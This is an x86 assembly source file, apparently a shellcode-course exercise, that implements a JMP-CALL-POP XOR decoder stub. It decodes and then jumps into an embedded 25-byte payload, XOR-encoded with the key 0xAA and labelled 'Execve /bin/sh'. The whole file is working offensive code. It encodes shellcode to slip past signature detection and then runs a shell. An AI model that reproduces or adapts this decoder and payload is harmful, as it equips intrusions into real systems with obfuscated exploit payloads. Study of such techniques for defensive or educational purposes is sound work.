; Date: 26/02/2019
; XOR-Decoder.asm
; Author: Daniele Votta
; Description: This program decode shellcode with XOR technique.
; JMP | CALL | POP | Techniques

global _start

section .text

_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	xor byte [esi], 0xAA
	inc esi
	loop decode
	jmp short Shellcode

	; Alternative with marker
	; xor byte [esi], 0xAA
	; jz Shellcode	
	; inc esi
	; jmp short decode

call_decoder:
	call decoder

	; Execve /bin/sh (25 bytes)
	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a ; ,0xAA Marker